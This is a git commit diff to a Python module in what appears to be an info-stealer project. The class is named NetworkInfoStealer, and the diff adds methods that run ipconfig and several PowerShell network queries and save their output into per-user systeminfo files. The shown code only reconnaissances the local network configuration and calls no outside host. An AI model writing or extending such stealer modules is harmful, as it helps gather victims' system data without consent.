d2add8467f5ac77a53fe4f3133f731655b0e679e
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2023-02-15 11:08:18 +0530

    get more network related info from powershell

--- modules/systeminfo/network.py
+++ modules/systeminfo/network.py
@@ -10,13 +10,34 @@ class NetworkInfoStealer(ModuleManager):
 
         self.systeminfo_folder = os.path.join(self.output_folder_user, 'systeminfo')
         self.ipconfig_filename = os.path.join(self.systeminfo_folder, 'ipconfig.txt')
+        self.ipconfiguration_filename = os.path.join(self.systeminfo_folder, 'ipconfiguration.txt')
+        self.physical_adapters_filename = os.path.join(self.systeminfo_folder, 'physical_adapters.txt')
+        self.getnet_ipconfig_filename = os.path.join(self.systeminfo_folder, 'getnet_ipinfo.txt')
 
         if not os.path.isdir(self.systeminfo_folder):
             os.makedirs(self.systeminfo_folder)
             
-            
-    def run(self) -> None:
+    def ipconfig(self) -> None:
         data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace")
         with open(self.ipconfig_filename, 'w', encoding='utf-8') as _file:
             _file.write(data)
-            
+    
+    def ipconfiguration(self)   -> None:
+        data = subprocess.check_output(['powershell', 'get-wmiobject Win32_NetworkAdapterConfiguration']).decode('utf-8', errors="backslashreplace")
+        with open(self.ipconfiguration_filename, 'w', encoding='utf-8') as _file:
+            _file.write(data)
+        
+    def physical_adapters(self)   -> None:
+        data = subprocess.check_output(['powershell', "Get-NetAdapter -physical| where status -eq 'up'"]).decode('utf-8', errors="backslashreplace")
+        with open(self.physical_adapters_filename, 'w', encoding='utf-8') as _file:
+            _file.write(data)
+    
+    def getnet_ipconfig(self)   -> None:
+        data = subprocess.check_output(['powershell', "Get-NetIPConfiguration -All"]).decode('utf-8', errors="backslashreplace")
+        with open(self.getnet_ipconfig_filename, 'w', encoding='utf-8') as _file:
+            _file.write(data)
+    
+    def run(self) -> None:
+        self.getnet_ipconfig()
+        
+        
